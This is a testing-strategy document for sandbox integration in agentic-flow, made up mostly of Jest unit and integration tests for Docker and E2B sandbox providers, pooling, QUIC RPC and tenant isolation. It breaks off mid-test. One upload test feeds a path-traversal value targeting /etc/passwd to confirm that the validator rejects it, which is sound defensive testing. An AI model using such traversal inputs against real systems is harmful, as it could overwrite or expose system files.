# Sandbox Integration Testing Strategy

**Version:** 1.0.0
**Date:** 2025-11-08
**Status:** Comprehensive Testing Specification
**Author:** QA Specialist
**Related Documents:**
- [Sandbox Integration Architecture](../architecture/SANDBOX-INTEGRATION-ARCHITECTURE.md)
- [Sandbox Integration Summary](../architecture/SANDBOX-INTEGRATION-SUMMARY.md)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Testing Pyramid](#testing-pyramid)
3. [Unit Testing Strategy](#unit-testing-strategy)
4. [Integration Testing Strategy](#integration-testing-strategy)
5. [Performance Testing](#performance-testing)
6. [Security Testing](#security-testing)
7. [Chaos Engineering](#chaos-engineering)
8. [Load Testing Strategy](#load-testing-strategy)
9. [Compliance & Validation](#compliance--validation)
10. [Test Automation Architecture](#test-automation-architecture)
11. [CI/CD Pipeline Integration](#cicd-pipeline-integration)
12. [Test Data Management](#test-data-management)
13. [Coverage Requirements](#coverage-requirements)
14. [Quality Gates](#quality-gates)
15. [Test Environment Specifications](#test-environment-specifications)
16. [Monitoring & Observability](#monitoring--observability)

---

## Executive Summary

This document defines a comprehensive testing strategy for the Claude Agent SDK sandbox integration into agentic-flow. Our approach ensures:

- ✅ **80%+ code coverage** across all components
- ✅ **<10% performance regression** vs native execution
- ✅ **Zero security vulnerabilities** in production
- ✅ **99.9% uptime** for sandbox infrastructure
- ✅ **100% backward compatibility** during migration

### Testing Philosophy

We follow the **Testing Pyramid** approach with emphasis on:

1. **Fast Feedback**: Unit tests run in <5 seconds
2. **Realistic Scenarios**: Integration tests mirror production workloads
3. **Performance First**: Every feature benchmarked before merge
4. **Security by Default**: Penetration testing in CI/CD
5. **Chaos Engineering**: Proactive failure injection

### Success Metrics by Phase

| Phase | Coverage | Performance | Security | Reliability |
|-------|----------|-------------|----------|-------------|
| **Phase 1: Foundation** | 85%+ | <5% regression | 0 critical | 99% success |
| **Phase 2: Hybrid Exec** | 80%+ | <10% regression | 0 critical | 95% success |
| **Phase 3: Full Sandbox** | 80%+ | <25% regression | 0 critical | 99.9% uptime |
| **Phase 4: Production** | 85%+ | <10% regression | 0 critical | 99.99% uptime |

---

## Testing Pyramid

```
                    /\
                   /  \
                  / E2E \         ← 5% (Slow, High-Value)
                 /--------\          20-50 tests
                /          \          5-10 min runtime
               / Integration \
              /--------------\     ← 15% (Moderate Coverage)
             /                \       100-200 tests
            /       Unit        \      2-5 min runtime
           /--------------------\
          /                      \  ← 80% (Fast, Focused)
         /________________________\    500-1000 tests
                                      <1 min runtime
```

### Test Distribution

```typescript
// Test Suite Composition
const testDistribution = {
  unit: {
    count: 650,
    runtime: '45s',
    coverage: '80-85%',
    focus: ['Sandbox providers', 'Coordinators', 'Memory layer', 'Utils']
  },
  integration: {
    count: 150,
    runtime: '3m',
    coverage: '70-75%',
    focus: ['Provider workflows', 'QUIC RPC', 'Federation', 'Security']
  },
  e2e: {
    count: 30,
    runtime: '8m',
    coverage: '50-60%',
    focus: ['Full swarm flows', 'Multi-region', 'Failure scenarios']
  },
  performance: {
    count: 25,
    runtime: '15m',
    focus: ['Load tests', 'Stress tests', 'Endurance', 'Spike tests']
  },
  security: {
    count: 40,
    runtime: '10m',
    focus: ['Penetration', 'Isolation', 'Auth/authz', 'Network security']
  }
};
```

---

## Unit Testing Strategy

### 1. Sandbox Provider Abstraction

#### Test Coverage Requirements
- ✅ All interface methods implemented
- ✅ Error handling for all failure modes
- ✅ Resource cleanup on success and failure
- ✅ Timeout enforcement
- ✅ Configuration validation

#### Example: E2B Provider Tests

```typescript
// tests/unit/sandbox/providers/e2b.test.ts
import { E2BSandboxProvider } from '@/sandbox/providers/e2b';
import { Sandbox } from '@e2b/sdk';

jest.mock('@e2b/sdk');

describe('E2BSandboxProvider', () => {
  let provider: E2BSandboxProvider;
  let mockSandbox: jest.Mocked<Sandbox>;

  beforeEach(() => {
    provider = new E2BSandboxProvider({
      apiKey: 'test-api-key'
    });
    mockSandbox = {
      id: 'test-sandbox-123',
      isRunning: true,
      commands: {
        run: jest.fn()
      },
      files: {
        write: jest.fn(),
        read: jest.fn()
      },
      getHostname: jest.fn(),
      kill: jest.fn()
    } as any;

    (Sandbox.create as jest.Mock).mockResolvedValue(mockSandbox);
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('create', () => {
    it('should create sandbox with default configuration', async () => {
      const config = {
        template: 'node',
        lifetime: 300
      };

      const sandbox = await provider.create(config);

      expect(Sandbox.create).toHaveBeenCalledWith({
        template: 'node',
        timeoutMs: 300000,
        metadata: expect.any(Object)
      });
      expect(sandbox.id).toBe('test-sandbox-123');
    });

    it('should install agentic-flow on sandbox creation', async () => {
      const sandbox = await provider.create({ template: 'node' });

      expect(mockSandbox.commands.run).toHaveBeenCalledWith(
        'npm install -g agentic-flow'
      );
    });

    it('should handle creation timeout', async () => {
      (Sandbox.create as jest.Mock).mockImplementation(
        () => new Promise((resolve) => setTimeout(resolve, 10000))
      );

      await expect(
        provider.create({ template: 'node', lifetime: 1 })
      ).rejects.toThrow('Sandbox creation timeout');
    }, 2000);

    it('should handle E2B API rate limiting', async () => {
      (Sandbox.create as jest.Mock).mockRejectedValue({
        code: 'RATE_LIMIT_EXCEEDED',
        retryAfter: 60
      });

      await expect(
        provider.create({ template: 'node' })
      ).rejects.toThrow('Rate limit exceeded');
    });

    it('should validate configuration', async () => {
      await expect(
        provider.create({ template: 'invalid-template' } as any)
      ).rejects.toThrow('Invalid template');
    });

    it('should handle network errors gracefully', async () => {
      (Sandbox.create as jest.Mock).mockRejectedValue(
        new Error('ECONNREFUSED')
      );

      await expect(
        provider.create({ template: 'node' })
      ).rejects.toThrow('Network error');
    });
  });

  describe('execute', () => {
    let sandbox: any;

    beforeEach(async () => {
      sandbox = await provider.create({ template: 'node' });
    });

    it('should execute command and return result', async () => {
      mockSandbox.commands.run.mockResolvedValue({
        stdout: 'Hello World',
        stderr: '',
        exitCode: 0,
        executionTime: 123
      });

      const result = await sandbox.execute('echo "Hello World"');

      expect(result).toEqual({
        stdout: 'Hello World',
        stderr: '',
        exitCode: 0,
        duration: 123
      });
    });

    it('should enforce command timeout', async () => {
      mockSandbox.commands.run.mockImplementation(
        () => new Promise((resolve) => setTimeout(resolve, 10000))
      );

      await expect(
        sandbox.execute('sleep 100', { timeout: 1000 })
      ).rejects.toThrow('Command timeout');
    });

    it('should pass environment variables', async () => {
      await sandbox.execute('env', {
        env: { FOO: 'bar', BAZ: 'qux' }
      });

      expect(mockSandbox.commands.run).toHaveBeenCalledWith(
        'env',
        expect.objectContaining({
          envs: { FOO: 'bar', BAZ: 'qux' }
        })
      );
    });

    it('should handle command failure with non-zero exit code', async () => {
      mockSandbox.commands.run.mockResolvedValue({
        stdout: '',
        stderr: 'Command not found',
        exitCode: 127,
        executionTime: 50
      });

      const result = await sandbox.execute('invalid-command');

      expect(result.exitCode).toBe(127);
      expect(result.stderr).toContain('Command not found');
    });
  });

  describe('uploadFiles', () => {
    let sandbox: any;

    beforeEach(async () => {
      sandbox = await provider.create({ template: 'node' });
    });

    it('should upload multiple files', async () => {
      const files = [
        { path: '/app/index.ts', content: 'console.log("Hello");' },
        { path: '/app/package.json', content: '{"name":"test"}' }
      ];

      await sandbox.uploadFiles(files);

      expect(mockSandbox.files.write).toHaveBeenCalledTimes(2);
      expect(mockSandbox.files.write).toHaveBeenCalledWith(
        '/app/index.ts',
        'console.log("Hello");'
      );
    });

    it('should handle upload errors', async () => {
      mockSandbox.files.write.mockRejectedValue(new Error('Disk full'));

      await expect(
        sandbox.uploadFiles([{ path: '/app/test.ts', content: 'test' }])
      ).rejects.toThrow('Disk full');
    });

    it('should validate file paths', async () => {
      await expect(
        sandbox.uploadFiles([{ path: '../../../etc/passwd', content: 'hack' }])
      ).rejects.toThrow('Invalid file path');
    });
  });

  describe('destroy', () => {
    it('should cleanup sandbox resources', async () => {
      const sandbox = await provider.create({ template: 'node' });
      await sandbox.destroy();

      expect(mockSandbox.kill).toHaveBeenCalled();
    });

    it('should handle already destroyed sandbox', async () => {
      const sandbox = await provider.create({ template: 'node' });
      mockSandbox.isRunning = false;

      await expect(sandbox.destroy()).resolves.not.toThrow();
    });

    it('should force destroy after timeout', async () => {
      const sandbox = await provider.create({ template: 'node' });
      mockSandbox.kill.mockImplementation(
        () => new Promise((resolve) => setTimeout(resolve, 10000))
      );

      await sandbox.destroy();

      // Should force kill after graceful shutdown timeout
      expect(mockSandbox.kill).toHaveBeenCalledWith({ force: true });
    });
  });

  describe('resource tracking', () => {
    it('should track sandbox resource usage', async () => {
      const sandbox = await provider.create({
        template: 'node',
        resources: {
          cpuMillis: 500,
          memoryMB: 512,
          diskMB: 1024
        }
      });

      const usage = await sandbox.getResourceUsage();

      expect(usage).toMatchObject({
        cpuPercent: expect.any(Number),
        memoryMB: expect.any(Number),
        diskMB: expect.any(Number)
      });
    });

    it('should enforce resource limits', async () => {
      const sandbox = await provider.create({
        template: 'node',
        resources: { memoryMB: 128 } // Very low limit
      });

      mockSandbox.commands.run.mockRejectedValue({
        code: 'OUT_OF_MEMORY',
        message: 'Process killed: memory limit exceeded'
      });

      await expect(
        sandbox.execute('node -e "const arr = new Array(1e9);"')
      ).rejects.toThrow('memory limit exceeded');
    });
  });
});
```

#### Example: Docker Provider Tests

```typescript
// tests/unit/sandbox/providers/docker.test.ts
import { DockerSandboxProvider } from '@/sandbox/providers/docker';
import Docker from 'dockerode';

jest.mock('dockerode');

describe('DockerSandboxProvider', () => {
  let provider: DockerSandboxProvider;
  let mockDocker: jest.Mocked<Docker>;
  let mockContainer: any;

  beforeEach(() => {
    mockContainer = {
      id: 'container-abc123',
      start: jest.fn(),
      stop: jest.fn(),
      remove: jest.fn(),
      exec: jest.fn(),
      inspect: jest.fn(),
      stats: jest.fn()
    };

    mockDocker = {
      createContainer: jest.fn().mockResolvedValue(mockContainer),
      getContainer: jest.fn().mockReturnValue(mockContainer),
      listContainers: jest.fn()
    } as any;

    (Docker as any).mockImplementation(() => mockDocker);
    provider = new DockerSandboxProvider();
  });

  describe('create', () => {
    it('should create container with resource limits', async () => {
      const config = {
        template: 'node',
        resources: {
          cpuMillis: 500,
          memoryMB: 512,
          diskMB: 1024
        }
      };

      await provider.create(config);

      expect(mockDocker.createContainer).toHaveBeenCalledWith(
        expect.objectContaining({
          Image: expect.stringContaining('node'),
          HostConfig: expect.objectContaining({
            Memory: 512 * 1024 * 1024,
            NanoCpus: 500 * 1_000_000
          })
        })
      );
    });

    it('should configure network isolation', async () => {
      const config = {
        template: 'node',
        network: {
          policy: 'restricted' as const,
          allowedHosts: ['api.anthropic.com']
        }
      };

      await provider.create(config);

      expect(mockDocker.createContainer).toHaveBeenCalledWith(
        expect.objectContaining({
          HostConfig: expect.objectContaining({
            NetworkMode: 'bridge'
          })
        })
      );
    });

    it('should apply security options', async () => {
      await provider.create({ template: 'node' });

      expect(mockDocker.createContainer).toHaveBeenCalledWith(
        expect.objectContaining({
          HostConfig: expect.objectContaining({
            SecurityOpt: expect.arrayContaining([
              'no-new-privileges:true'
            ]),
            ReadonlyRootfs: true,
            CapDrop: ['ALL']
          })
        })
      );
    });

    it('should start container after creation', async () => {
      await provider.create({ template: 'node' });

      expect(mockContainer.start).toHaveBeenCalled();
    });

    it('should handle image pull failure', async () => {
      mockDocker.createContainer.mockRejectedValue({
        statusCode: 404,
        message: 'Image not found'
      });

      await expect(
        provider.create({ template: 'nonexistent' })
      ).rejects.toThrow('Image not found');
    });

    it('should retry on transient failures', async () => {
      mockDocker.createContainer
        .mockRejectedValueOnce(new Error('Temporary failure'))
        .mockRejectedValueOnce(new Error('Temporary failure'))
        .mockResolvedValueOnce(mockContainer);

      const sandbox = await provider.create({ template: 'node' });

      expect(mockDocker.createContainer).toHaveBeenCalledTimes(3);
      expect(sandbox.id).toBe('container-abc123');
    });
  });

  describe('networking', () => {
    it('should expose ports for QUIC endpoint', async () => {
      const sandbox = await provider.create({ template: 'node' });

      const { hostPort } = await sandbox.exposePort(4433);

      expect(hostPort).toBeGreaterThan(30000); // Ephemeral port range
      expect(hostPort).toBeLessThan(65536);
    });

    it('should track exposed ports', async () => {
      const sandbox = await provider.create({ template: 'node' });

      await sandbox.exposePort(4433);
      await sandbox.exposePort(8080);

      const ports = await sandbox.getExposedPorts();
      expect(ports).toHaveLength(2);
    });

    it('should enforce network policy', async () => {
      const sandbox = await provider.create({
        template: 'node',
        network: { policy: 'none' }
      });

      // Attempting network access should fail
      mockContainer.exec.mockResolvedValue({
        start: jest.fn().mockRejectedValue(new Error('Network unreachable'))
      });

      await expect(
        sandbox.execute('curl https://example.com')
      ).rejects.toThrow('Network unreachable');
    });
  });

  describe('resource monitoring', () => {
    it('should report accurate resource usage', async () => {
      const sandbox = await provider.create({ template: 'node' });

      mockContainer.stats.mockResolvedValue({
        cpu_stats: {
          cpu_usage: { total_usage: 500000000 }
        },
        memory_stats: {
          usage: 256 * 1024 * 1024
        }
      });

      const usage = await sandbox.getResourceUsage();

      expect(usage.cpuPercent).toBeGreaterThan(0);
      expect(usage.memoryMB).toBe(256);
    });

    it('should detect resource limit violations', async () => {
      const sandbox = await provider.create({
        template: 'node',
        resources: { memoryMB: 256 }
      });

      mockContainer.inspect.mockResolvedValue({
        State: {
          OOMKilled: true
        }
      });

      const status = await sandbox.getStatus();
      expect(status.oomKilled).toBe(true);
    });
  });

  describe('cleanup', () => {
    it('should remove container on destroy', async () => {
      const sandbox = await provider.create({ template: 'node' });
      await sandbox.destroy();

      expect(mockContainer.stop).toHaveBeenCalled();
      expect(mockContainer.remove).toHaveBeenCalledWith({ force: true });
    });

    it('should cleanup orphaned containers', async () => {
      mockDocker.listContainers.mockResolvedValue([
        { Id: 'orphan-1', Labels: { 'agentic-flow': 'true' } },
        { Id: 'orphan-2', Labels: { 'agentic-flow': 'true' } }
      ]);

      await provider.cleanupOrphaned();

      expect(mockContainer.remove).toHaveBeenCalledTimes(2);
    });
  });
});
```

### 2. Sandbox Manager Tests

```typescript
// tests/unit/sandbox/manager.test.ts
import { SandboxManager } from '@/sandbox/manager';
import { E2BSandboxProvider } from '@/sandbox/providers/e2b';
import { DockerSandboxProvider } from '@/sandbox/providers/docker';

describe('SandboxManager', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        e2b: new E2BSandboxProvider({ apiKey: 'test' }),
        docker: new DockerSandboxProvider()
      }
    });
  });

  describe('provider selection', () => {
    it('should use default provider when not specified', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node'
      });

      expect(sandbox.provider).toBe('docker');
    });

    it('should allow explicit provider selection', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        provider: 'e2b'
      });

      expect(sandbox.provider).toBe('e2b');
    });

    it('should fallback to alternative provider on failure', async () => {
      jest.spyOn(manager['providers'].e2b, 'create')
        .mockRejectedValue(new Error('E2B unavailable'));

      const sandbox = await manager.createSandbox({
        template: 'node',
        provider: 'e2b',
        fallback: ['docker']
      });

      expect(sandbox.provider).toBe('docker');
    });
  });

  describe('sandbox pooling', () => {
    it('should reuse warm sandboxes from pool', async () => {
      // Create and return sandbox to pool
      const sandbox1 = await manager.createSandbox({ template: 'node' });
      await manager.releaseSandbox(sandbox1.id);

      // Request new sandbox (should get pooled one)
      const sandbox2 = await manager.createSandbox({ template: 'node' });

      expect(sandbox2.id).toBe(sandbox1.id);
      expect(sandbox2.startupTime).toBeLessThan(50); // <50ms for warm start
    });

    it('should limit pool size', async () => {
      const config = { template: 'node' };

      // Create 10 sandboxes
      const sandboxes = await Promise.all(
        Array(10).fill(null).map(() => manager.createSandbox(config))
      );

      // Release all
      await Promise.all(
        sandboxes.map(s => manager.releaseSandbox(s.id))
      );

      const poolSize = await manager.getPoolSize('node');
      expect(poolSize).toBeLessThanOrEqual(5); // Max pool size
    });

    it('should evict idle sandboxes from pool', async () => {
      jest.useFakeTimers();

      const sandbox = await manager.createSandbox({ template: 'node' });
      await manager.releaseSandbox(sandbox.id);

      // Fast-forward 10 minutes
      jest.advanceTimersByTime(10 * 60 * 1000);

      const poolSize = await manager.getPoolSize('node');
      expect(poolSize).toBe(0); // Evicted due to idle timeout

      jest.useRealTimers();
    });
  });

  describe('resource management', () => {
    it('should track total resource usage', async () => {
      await Promise.all([
        manager.createSandbox({
          template: 'node',
          resources: { cpuMillis: 500, memoryMB: 512 }
        }),
        manager.createSandbox({
          template: 'node',
          resources: { cpuMillis: 500, memoryMB: 512 }
        })
      ]);

      const usage = await manager.getTotalResourceUsage();

      expect(usage.cpuMillis).toBe(1000);
      expect(usage.memoryMB).toBe(1024);
    });

    it('should enforce global resource limits', async () => {
      manager = new SandboxManager({
        defaultProvider: 'docker',
        providers: { docker: new DockerSandboxProvider() },
        limits: {
          maxConcurrentSandboxes: 2,
          maxTotalMemoryMB: 1024
        }
      });

      await Promise.all([
        manager.createSandbox({
          template: 'node',
          resources: { memoryMB: 512 }
        }),
        manager.createSandbox({
          template: 'node',
          resources: { memoryMB: 512 }
        })
      ]);

      // Third sandbox should fail (exceeds limits)
      await expect(
        manager.createSandbox({
          template: 'node',
          resources: { memoryMB: 512 }
        })
      ).rejects.toThrow('Resource limit exceeded');
    });
  });

  describe('error handling', () => {
    it('should handle provider unavailability', async () => {
      jest.spyOn(manager['providers'].docker, 'create')
        .mockRejectedValue(new Error('Docker daemon not running'));

      await expect(
        manager.createSandbox({ template: 'node' })
      ).rejects.toThrow('Docker daemon not running');
    });

    it('should cleanup on sandbox creation failure', async () => {
      const createSpy = jest.spyOn(manager['providers'].docker, 'create')
        .mockImplementation(async () => {
          throw new Error('Creation failed');
        });

      await expect(
        manager.createSandbox({ template: 'node' })
      ).rejects.toThrow();

      // Verify no orphaned resources
      const sandboxes = await manager.listSandboxes();
      expect(sandboxes).toHaveLength(0);
    });
  });
});
```

### 3. Coordinator Tests

```typescript
// tests/unit/swarm/sandbox-coordinator.test.ts
import { SandboxSwarmCoordinator } from '@/swarm/sandbox-coordinator';
import { SandboxManager } from '@/sandbox/manager';
import { ReasoningBankClient } from '@/reasoningbank/client';

describe('SandboxSwarmCoordinator', () => {
  let coordinator: SandboxSwarmCoordinator;
  let mockSandboxManager: jest.Mocked<SandboxManager>;
  let mockReasoningBank: jest.Mocked<ReasoningBankClient>;

  beforeEach(() => {
    mockSandboxManager = {
      createSandbox: jest.fn(),
      destroySandbox: jest.fn(),
      listSandboxes: jest.fn()
    } as any;

    mockReasoningBank = {
      storePattern: jest.fn(),
      searchPatterns: jest.fn()
    } as any;

    coordinator = new SandboxSwarmCoordinator({
      topology: 'hierarchical',
      sandboxManager: mockSandboxManager,
      reasoningBank: mockReasoningBank
    });
  });

  describe('hybrid execution', () => {
    it('should decompose task into subtasks', async () => {
      const task = 'Refactor 100 TypeScript modules';

      const subtasks = await coordinator.decomposeTask(task);

      expect(subtasks.length).toBeGreaterThan(1);
      expect(subtasks.length).toBeLessThanOrEqual(10); // Batch size limit
    });

    it('should spawn sandboxed workers for subtasks', async () => {
      mockSandboxManager.createSandbox.mockResolvedValue({
        id: 'sandbox-1',
        execute: jest.fn()
      } as any);

      await coordinator.executeHybridSwarm({
        task: 'Refactor modules',
        agentType: 'coder',
        batchSize: 3
      });

      expect(mockSandboxManager.createSandbox).toHaveBeenCalledTimes(3);
    });

    it('should aggregate results from workers', async () => {
      mockReasoningBank.searchPatterns.mockResolvedValue([
        { id: '1', output: 'result-1', reward: 0.9 },
        { id: '2', output: 'result-2', reward: 0.85 },
        { id: '3', output: 'result-3', reward: 0.95 }
      ]);

      const result = await coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 3
      });

      expect(result.aggregatedOutput).toBeDefined();
      expect(result.successRate).toBeGreaterThan(0.8);
    });

    it('should handle worker failures gracefully', async () => {
      mockSandboxManager.createSandbox
        .mockResolvedValueOnce({
          id: 'sandbox-1',
          execute: jest.fn().mockResolvedValue({ exitCode: 0 })
        } as any)
        .mockResolvedValueOnce({
          id: 'sandbox-2',
          execute: jest.fn().mockRejectedValue(new Error('Worker failed'))
        } as any)
        .mockResolvedValueOnce({
          id: 'sandbox-3',
          execute: jest.fn().mockResolvedValue({ exitCode: 0 })
        } as any);

      const result = await coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 3
      });

      expect(result.successRate).toBeCloseTo(0.67, 1); // 2/3 succeeded
    });

    it('should cleanup sandboxes after execution', async () => {
      await coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 3
      });

      expect(mockSandboxManager.destroySandbox).toHaveBeenCalledTimes(3);
    });
  });

  describe('performance optimization', () => {
    it('should reuse warm sandboxes from pool', async () => {
      const startTime = Date.now();

      await coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 3,
        reuseWarmSandboxes: true
      });

      const duration = Date.now() - startTime;

      expect(duration).toBeLessThan(2500); // Should benefit from pooling
    });

    it('should batch memory operations', async () => {
      await coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 3
      });

      // Should store all patterns in one batch
      expect(mockReasoningBank.storePattern).toHaveBeenCalledTimes(1);
      const call = mockReasoningBank.storePattern.mock.calls[0][0];
      expect(call).toHaveLength(3); // Batch of 3 patterns
    });
  });

  describe('fault tolerance', () => {
    it('should retry failed workers', async () => {
      const failingExecute = jest.fn()
        .mockRejectedValueOnce(new Error('Temporary failure'))
        .mockResolvedValueOnce({ exitCode: 0 });

      mockSandboxManager.createSandbox.mockResolvedValue({
        id: 'sandbox-1',
        execute: failingExecute
      } as any);

      await coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 1,
        retryPolicy: { maxRetries: 2 }
      });

      expect(failingExecute).toHaveBeenCalledTimes(2); // Initial + 1 retry
    });

    it('should detect stuck workers and timeout', async () => {
      mockSandboxManager.createSandbox.mockResolvedValue({
        id: 'sandbox-1',
        execute: jest.fn().mockImplementation(
          () => new Promise(() => {}) // Never resolves
        )
      } as any);

      const promise = coordinator.executeHybridSwarm({
        task: 'Test task',
        agentType: 'coder',
        batchSize: 1,
        timeout: 1000
      });

      await expect(promise).rejects.toThrow('Worker timeout');
    }, 2000);
  });
});
```

---

## Integration Testing Strategy

### 20+ Critical Integration Test Scenarios

#### 1. End-to-End Sandbox Workflows

```typescript
// tests/integration/sandbox-workflows.test.ts
describe('Sandbox Integration Workflows', () => {
  describe('E2B Provider Workflow', () => {
    it('should create, execute, and destroy E2B sandbox', async () => {
      const provider = new E2BSandboxProvider({
        apiKey: process.env.E2B_API_KEY
      });

      // Create sandbox
      const sandbox = await provider.create({
        template: 'node',
        lifetime: 300
      });
      expect(sandbox.id).toBeDefined();

      // Execute command
      const result = await sandbox.execute('echo "Hello from E2B"');
      expect(result.stdout).toContain('Hello from E2B');
      expect(result.exitCode).toBe(0);

      // Upload files
      await sandbox.uploadFiles([
        {
          path: '/app/test.ts',
          content: 'console.log("Test file");'
        }
      ]);

      // Execute uploaded file
      const execResult = await sandbox.execute('node /app/test.ts');
      expect(execResult.stdout).toContain('Test file');

      // Cleanup
      await sandbox.destroy();

      // Verify destroyed
      await expect(
        sandbox.execute('echo "Should fail"')
      ).rejects.toThrow();
    }, 30000); // 30s timeout for E2B provisioning

    it('should handle concurrent E2B sandbox creation', async () => {
      const provider = new E2BSandboxProvider({
        apiKey: process.env.E2B_API_KEY
      });

      const startTime = Date.now();

      // Create 5 sandboxes concurrently
      const sandboxes = await Promise.all(
        Array(5).fill(null).map(() =>
          provider.create({ template: 'node' })
        )
      );

      const duration = Date.now() - startTime;

      expect(sandboxes).toHaveLength(5);
      expect(duration).toBeLessThan(3000); // Parallel creation <3s

      // Cleanup
      await Promise.all(sandboxes.map(s => s.destroy()));
    }, 60000);
  });

  describe('Docker Provider Workflow', () => {
    it('should create, execute, and destroy Docker sandbox', async () => {
      const provider = new DockerSandboxProvider();

      const sandbox = await provider.create({
        template: 'node',
        resources: {
          cpuMillis: 500,
          memoryMB: 512
        }
      });

      // Execute command
      const result = await sandbox.execute('node --version');
      expect(result.stdout).toMatch(/v\d+\.\d+\.\d+/);

      // Check resource limits
      const usage = await sandbox.getResourceUsage();
      expect(usage.memoryMB).toBeLessThanOrEqual(512);

      // Cleanup
      await sandbox.destroy();
    }, 10000);

    it('should enforce Docker network isolation', async () => {
      const provider = new DockerSandboxProvider();

      const sandbox = await provider.create({
        template: 'node',
        network: { policy: 'none' }
      });

      // Network access should fail
      const result = await sandbox.execute(
        'curl -m 2 https://example.com'
      );
      expect(result.exitCode).not.toBe(0);

      await sandbox.destroy();
    }, 10000);

    it('should expose ports correctly', async () => {
      const provider = new DockerSandboxProvider();

      const sandbox = await provider.create({ template: 'node' });

      // Start HTTP server in sandbox
      await sandbox.execute(
        'node -e "require(\'http\').createServer((req, res) => res.end(\'OK\')).listen(8080)" &'
      );

      // Expose port
      const { hostPort } = await sandbox.exposePort(8080);

      // Verify accessible from host
      const response = await fetch(`http://localhost:${hostPort}`);
      expect(await response.text()).toBe('OK');

      await sandbox.destroy();
    }, 15000);
  });

  describe('Provider Failover', () => {
    it('should fallback from E2B to Docker on failure', async () => {
      const manager = new SandboxManager({
        defaultProvider: 'e2b',
        providers: {
          e2b: new E2BSandboxProvider({ apiKey: 'invalid-key' }),
          docker: new DockerSandboxProvider()
        }
      });

      // E2B will fail, should fallback to Docker
      const sandbox = await manager.createSandbox({
        template: 'node',
        provider: 'e2b',
        fallback: ['docker']
      });

      expect(sandbox.provider).toBe('docker');
      expect(sandbox.id).toBeDefined();

      await sandbox.destroy();
    }, 10000);
  });
});
```

#### 2. QUIC RPC Integration Tests

```typescript
// tests/integration/quic-rpc.test.ts
import { ReasoningBankServer } from '@/reasoningbank/server';
import { ReasoningBankClient } from '@/reasoningbank/client';
import { QuicServer } from '@/transport/quic-server';

describe('QUIC RPC Integration', () => {
  let server: ReasoningBankServer;
  let client: ReasoningBankClient;

  beforeAll(async () => {
    // Start QUIC server
    server = new ReasoningBankServer({
      port: 5433,
      dbPath: ':memory:'
    });
    await server.start();

    // Create client
    client = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: 'test-token'
    });
  });

  afterAll(async () => {
    await server.stop();
  });

  it('should store and retrieve patterns via QUIC RPC', async () => {
    const pattern = {
      sessionId: 'test-session',
      task: 'Test task',
      output: { result: 'success' },
      reward: 0.95,
      success: true
    };

    // Store pattern
    await client.storePattern(pattern);

    // Retrieve pattern
    const results = await client.searchPatterns('Test task', { k: 1 });

    expect(results).toHaveLength(1);
    expect(results[0].task).toBe('Test task');
    expect(results[0].reward).toBe(0.95);
  });

  it('should handle concurrent RPC calls efficiently', async () => {
    const startTime = Date.now();

    // 100 concurrent RPC calls
    await Promise.all(
      Array(100).fill(null).map((_, i) =>
        client.storePattern({
          sessionId: `session-${i}`,
          task: `Task ${i}`,
          output: { index: i },
          reward: 0.9,
          success: true
        })
      )
    );

    const duration = Date.now() - startTime;

    expect(duration).toBeLessThan(1000); // <1s for 100 calls
  });

  it('should enforce JWT authentication', async () => {
    const unauthClient = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: 'invalid-token'
    });

    await expect(
      unauthClient.storePattern({
        sessionId: 'test',
        task: 'test',
        output: {},
        reward: 0,
        success: false
      })
    ).rejects.toThrow('Authentication failed');
  });

  it('should handle connection loss and reconnect', async () => {
    // Disconnect client
    await client.disconnect();

    // Wait 1 second
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Reconnect and execute RPC (should auto-reconnect)
    const result = await client.searchPatterns('test', { k: 1 });

    expect(result).toBeDefined();
  });

  it('should measure RPC latency', async () => {
    const latencies: number[] = [];

    for (let i = 0; i < 100; i++) {
      const startTime = Date.now();

      await client.storePattern({
        sessionId: `latency-test-${i}`,
        task: 'Latency measurement',
        output: {},
        reward: 0.9,
        success: true
      });

      latencies.push(Date.now() - startTime);
    }

    const avgLatency = latencies.reduce((a, b) => a + b, 0) / latencies.length;
    const p95Latency = latencies.sort()[Math.floor(latencies.length * 0.95)];

    expect(avgLatency).toBeLessThan(20); // <20ms average
    expect(p95Latency).toBeLessThan(50); // <50ms P95
  });
});
```

#### 3. Federation Hub Integration Tests

```typescript
// tests/integration/federation-hub.test.ts
import { SandboxFederationHub } from '@/federation/sandbox-hub';
import { DockerSandboxProvider } from '@/sandbox/providers/docker';

describe('Federation Hub Integration', () => {
  let hub: SandboxFederationHub;

  beforeAll(async () => {
    hub = new SandboxFederationHub({
      region: 'test-region',
      quicPort: 5433,
      agentdb: ':memory:'
    });
    await hub.start();
  });

  afterAll(async () => {
    await hub.shutdown();
  });

  it('should spawn ephemeral sandboxed agent', async () => {
    const agent = await hub.spawnEphemeralAgent({
      agentType: 'coder',
      task: 'Write a simple function',
      lifetime: 60, // 1 minute
      sandboxProvider: new DockerSandboxProvider(),
      tenantId: 'test-tenant'
    });

    expect(agent.agentId).toBeDefined();
    expect(agent.sandboxId).toBeDefined();
    expect(agent.jwt).toBeDefined();

    // Wait for agent to complete
    const result = await hub.waitForCompletion([agent.agentId], 30000);

    expect(result[0].success).toBe(true);
  }, 45000);

  it('should isolate tenants in memory namespace', async () => {
    // Tenant A stores pattern
    const clientA = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: await hub.issueToken({ tenantId: 'tenant-a' })
    });

    await clientA.storePattern({
      sessionId: 'tenant-a-session',
      task: 'Secret task A',
      output: { secret: 'A' },
      reward: 0.9,
      success: true
    });

    // Tenant B tries to access Tenant A's patterns
    const clientB = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: await hub.issueToken({ tenantId: 'tenant-b' })
    });

